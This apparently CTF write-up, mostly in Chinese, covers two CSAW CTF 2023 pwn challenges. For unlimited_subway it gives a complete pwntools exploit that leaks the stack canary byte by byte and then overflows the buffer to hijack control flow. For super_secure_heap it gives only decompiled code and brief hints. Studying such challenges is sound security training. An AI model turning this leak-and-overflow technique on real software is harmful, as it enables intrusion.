---
title: CSAW CTF 2023 Writeup
contest: CSAW CTF
year: 2023
difficulty: medium
vuln_type: pwn_unknown
tags: [unlimited_subway 32位, canary泄, Partial RELRO, No PIE, super_secure_heap 64位, Full RelRO PIE, endbr64, 整数边界, set+delete+secure_stuff, F/D/V/E 命令]
attack_chain:
  - unlimited_subway: 32 位 ELF, Canary/NX/Partial RELRO/No PIE
  - view_account 按字节读, index 128-131 读 4 字节 canary
  - payload: 44 'A' + 'AAAA'*5 + p32(canary) + p32(0x0804900e) + p32(0x8049304)
  - super_secure_heap: 64 位 ELF PIE + Full RELRO + Canary
  - set(): 读 int item 0-9, size 必须 < 已存 size, secure_stuff(key)
  - delete(): free + 条件清零 size 和指针
  - 整数边界 set 触发越界, secure_stuff 漏洞
key_payload: 'view 按字节读 / canary 128-131 / 44+20+4+4+4 payload / endbr64 64位 PIE / set 整数边界 / secure_stuff 加密'
one_liner: CSAW CTF 2023 — unlimited_subway 32位 canary按字节泄+super_secure_heap 64位 PIE+Full RELRO set/delete secure_stuff 漏洞链。
lesson: 按字节 (printf %02x) 读 canary 是经典;32 位 Partial RELRO 可直接覆盖返回;64 位 PIE + Full RELRO 需 leak PIE base + 改 got (Full RELRO 不行只能 FSOP/IO_FILE)。
quality: high
---

# CSAW CTF 2023 Writeup

## 速读
CSAW CTF 2023 — 2 道 Pwn: unlimited_subway + super_secure_heap。

## unlimited_subway (32 位)
```c
int view_account(int a1, int a2) {
    return printf("Index %d : %02x\n", a2, *(unsigned __int8 *)(a2 + a1));
}
```

### EXP
```python
from pwn import *
r = process("./share/unlimited_subway")

def fill(data):
    r.sendlineafter(b"> ", b"F")
    r.sendlineafter(b"Data :", str(data))

def view(idx):
    r.sendlineafter(b"> ", b"V")
    r.sendlineafter(b"Index :", str(idx))
    return r.recvline().split()[3]

# Leak canary
canary_leak = b"0x"
canary_leak += view(131) + view(130) + view(129) + view(128)
canary_leak = int(canary_leak, 16)

# Exploit
p = b""
p += b"A" * 44
p += b"AAAA" * 5
p += p32(canary_leak)
p += p32(0x0804900e)
p += p32(0x8049304)

r.sendlineafter(b"> ", b"E")
r.sendlineafter(b"Name Size :", str(2000))
r.sendlineafter(b"Name :", p)
r.interactive()
```

## super_secure_heap (64 位 PIE + Full RELRO)
```c
__int64 set(__int64 a1, __int64 a2, __int64 a3) {
    int v4 = read_int("Enter the item you want to modify:");
    if (v4 <= 9) {
        if (a3) {  // secure mode
            int v5 = read_int("Enter the key number:");
            if (v5 >= 0 && v5 <= 9 && keys[v5]) {
                int v6 = read_int("Enter the size of the content:");
                if (v6 >= *(a2 + 4 * (v4 + 20))) {
                    return sub_1130("Invalid size.", a3);
                } else {
                    sub_1140(0, *(a2 + 8 * v4), v6);
                    return secure_stuff(v4, v5, v6);
                }
            }
        }
    }
}
```

## 关键点
- 32 位 canary 按字节泄: `view(128) view(129) view(130) view(131)` (倒序拼)
- 64 位 Full RELRO 不能改 got, 走 IO_FILE
